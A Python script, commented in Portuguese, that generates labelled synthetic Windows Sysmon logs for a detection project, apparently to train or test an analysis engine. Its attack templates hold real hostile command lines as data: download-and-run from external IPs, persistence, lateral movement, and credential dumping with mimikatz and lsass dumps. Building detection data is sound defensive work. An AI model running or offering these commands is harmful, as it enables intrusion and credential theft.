# SentinelAI - Gerador de logs sinteticos Windows
# Gera logs Windows e organiza os ficheiros por categoria.

import os
import random
import json
from datetime import datetime, timedelta

# ============================================================
# CONFIGURAÇÃO
# ============================================================

OUTPUT_BASE = "logs"

HOSTS_WINDOWS = ["DESKTOP-ABC123", "WORKSTATION-01", "SRV-FINANCE", "PC-JOHN", "LAPTOP-HR"]
USERS         = ["john.doe", "admin", "alice", "bob", "svc_backup", "guest"]
IPS_INTERNAL  = ["192.168.1.10", "192.168.1.20", "192.168.1.50", "10.0.0.5"]
IPS_EXTERNAL  = ["185.220.101.1", "45.33.32.156", "198.51.100.1", "203.0.113.42"]

# ============================================================
# UTILITÁRIOS
# ============================================================

def random_time(days_back: int = 30) -> str:
    base = datetime.now() - timedelta(days=random.randint(0, days_back),
                                      hours=random.randint(0, 23),
                                      minutes=random.randint(0, 59),
                                      seconds=random.randint(0, 59))
    return base.strftime("%Y-%m-%dT%H:%M:%S.000Z")

def random_pid() -> int:
    return random.randint(1000, 65535)

def random_host() -> str:
    return random.choice(HOSTS_WINDOWS)

def random_user() -> str:
    return random.choice(USERS)

def save_logs(logs: list, category: str, subcategory: str | None, filename: str):
    """Guarda logs no ficheiro correto e cria as pastas em falta."""
    if subcategory:
        folder = os.path.join(OUTPUT_BASE, category, subcategory, "windows")
    else:
        folder = os.path.join(OUTPUT_BASE, category, "windows")

    os.makedirs(folder, exist_ok=True)
    filepath = os.path.join(folder, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        for log in logs:
            f.write(json.dumps(log, ensure_ascii=False) + "\n")

    print(f"  OK  {len(logs):>3} logs -> {filepath}")
    return filepath

# ============================================================
# LOGS NORMAIS - WINDOWS
# ============================================================

def gen_normal_windows(n: int = 80) -> list:
    normal_commands = [
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\cmd.exe /c dir",
        "C:\\Windows\\System32\\ipconfig.exe /all",
        "C:\\Windows\\System32\\tasklist.exe",
        "C:\\Windows\\System32\\ping.exe google.com",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\mspaint.exe",
        "C:\\Windows\\System32\\calc.exe",
        "python.exe C:\\Projects\\script.py",
        "git.exe commit -m fix",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Process",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Service",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Date",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs",
        "C:\\Windows\\System32\\services.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\spoolsv.exe",
    ]
    logs = []
    for _ in range(n):
        host = random_host()
        user = random_user()
        cmd  = random.choice(normal_commands)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": host,
            "User": user,
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "normal"
        })
    return logs

# ============================================================
# ATTACK - PERSISTENCE - WINDOWS
# ============================================================

def gen_attack_persistence_windows(n: int = 40) -> list:
    templates = [
        lambda: {
            "EventID": "13", "EventType": "Registry Value Set (Sysmon)",
            "TargetObject": f"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{random.choice(['updater','svchost32','winlogon_helper'])}",
            "Details": f"C:\\Users\\{random_user()}\\AppData\\Roaming\\{random.choice(['malware.exe','payload.exe','backdoor.exe'])}",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "CommandLine": f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d C:\\malware.exe"
        },
        lambda: {
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": f"schtasks /create /tn {random.choice(['updater','svchelper','winupdate'])} /tr C:\\Windows\\Temp\\payload.exe /sc onlogon /ru SYSTEM",
        },
        lambda: {
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "Image": "C:\\Windows\\System32\\sc.exe",
            "CommandLine": f"sc create malservice binpath= C:\\malware.exe start= auto",
        },
    ]
    logs = []
    for _ in range(n):
        host = random_host()
        template = random.choice(templates)
        entry = {
            "source": "windows", "format": "json_synthetic",
            "TimeCreated": random_time(),
            "Computer": host,
            "User": random_user(),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Persistence",
            "mitre_technique": "T1547 - Boot or Logon Autostart Execution",
        }
        entry.update(template())
        logs.append(entry)
    return logs

# ============================================================
# ATTACK - EXECUTION - WINDOWS
# ============================================================

def gen_attack_execution_windows(n: int = 40) -> list:
    templates = [
        f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
        f"powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
        f"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://{random.choice(IPS_EXTERNAL)}/shell.ps1')",
        f"certutil.exe -urlcache -f http://{random.choice(IPS_EXTERNAL)}/payload.exe C:\\Windows\\Temp\\payload.exe",
        f"mshta.exe http://{random.choice(IPS_EXTERNAL)}/payload.hta",
        f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
        f"wscript.exe C:\\Users\\Public\\payload.vbs",
        f"regsvr32 /s /n /u /i:http://{random.choice(IPS_EXTERNAL)}/payload.sct scrobj.dll",
        f"msiexec /q /i http://{random.choice(IPS_EXTERNAL)}/malware.msi",
        f"bitsadmin /transfer job /download /priority high http://{random.choice(IPS_EXTERNAL)}/a.exe C:\\temp\\a.exe",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host(),
            "User": random_user(),
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Execution",
            "mitre_technique": "T1059 - Command and Scripting Interpreter",
        })
    return logs

# ============================================================
# ATTACK - LATERAL MOVEMENT - WINDOWS
# ============================================================

def gen_attack_lateral_windows(n: int = 30) -> list:
    templates = [
        f"psexec.exe \\\\{random.choice(IPS_INTERNAL)} -u admin -p pass123 cmd.exe",
        f"wmic /node:{random.choice(IPS_INTERNAL)} process call create cmd.exe",
        f"net use \\\\{random.choice(IPS_INTERNAL)}\\IPC$ password /user:domain\\admin",
        f"powershell Invoke-Command -ComputerName {random.choice(IPS_INTERNAL)} -ScriptBlock {{whoami}}",
        f"smbclient \\\\{random.choice(IPS_INTERNAL)}\\C$ -U admin%pass123",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host(),
            "User": random_user(),
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Lateral Movement",
            "mitre_technique": "T1021 - Remote Services",
        })
    return logs

# ============================================================
# ATTACK - CREDENTIAL ACCESS - WINDOWS
# ============================================================

def gen_attack_credential_windows(n: int = 30) -> list:
    templates = [
        "mimikatz.exe sekurlsa::logonpasswords",
        "mimikatz.exe lsadump::sam",
        f"procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass_{random.randint(100,999)}.dmp",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full",
        f"reg save HKLM\\SAM C:\\temp\\sam_{random.randint(100,999)}.hive",
        f"reg save HKLM\\SYSTEM C:\\temp\\system.hive",
        f"net user {random_user()} NewPass123! /add",
        f"net localgroup administrators {random_user()} /add",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host(),
            "User": random_user(),
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1003 - OS Credential Dumping",
        })
    return logs

# ============================================================
# MAIN - Gerar e organizar tudo
# ============================================================

def main():
    print("=" * 55)
    print("  SentinelAI - Gerador de Logs Sinteticos Windows")
    print("=" * 55)
    print()

    generators = [
        # (função,                          category,  subcategory,        platform,    filename)
        (gen_normal_windows, "normal", None, "normal_windows.jsonl"),
        (gen_attack_persistence_windows, "attack", "persistence", "persistence_windows.jsonl"),
        (gen_attack_execution_windows, "attack", "execution", "execution_windows.jsonl"),
        (gen_attack_lateral_windows, "attack", "lateral_movement", "lateral_movement_windows.jsonl"),
        (gen_attack_credential_windows, "attack", "credential_access", "credential_access_windows.jsonl"),
    ]

    total = 0
    for gen_fn, category, subcategory, filename in generators:
        logs = gen_fn()
        save_logs(logs, category, subcategory, filename)
        total += len(logs)

    print()
    print(f"  Total de logs gerados: {total}")
    print()
    print("  Estrutura criada:")
    for root, dirs, files in os.walk(OUTPUT_BASE):
        level = root.replace(OUTPUT_BASE, "").count(os.sep)
        indent = "  " + "  " * level
        print(f"{indent}[DIR] {os.path.basename(root)}/")
        for f in files:
            subindent = "  " + "  " * (level + 1)
            print(f"{subindent}[FILE] {f}")

    print()
    print("  Geracao concluida. O motor de analise pode ser executado em seguida.")
    print("=" * 55)

if __name__ == "__main__":
    main()
